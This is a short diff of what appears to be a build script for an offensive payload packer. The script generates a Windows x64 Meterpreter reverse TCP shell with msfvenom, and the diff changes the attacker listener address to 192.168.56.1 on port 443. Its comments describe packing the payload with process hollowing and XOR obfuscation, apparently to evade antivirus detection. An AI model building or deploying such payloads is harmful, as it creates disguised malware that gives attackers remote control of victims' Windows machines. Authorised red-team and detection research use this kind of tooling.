@@ -10,7 +10,7 @@
 echo "" > defs.h
 # Generate reverse tcp shell payload via metasploit
 # Adjust parameters to your needs
-msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.103 lport=22222 -f exe -a x64 --platform Windows > payloads/revtcp64.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=443 -f exe -a x64 --platform Windows > payloads/revtcp64.exe
 # Call make_bfg and compile the payload into the executable
 # -H switch enables hollowing functionality
 # Set -x flag to use xor obfuscation on the payload
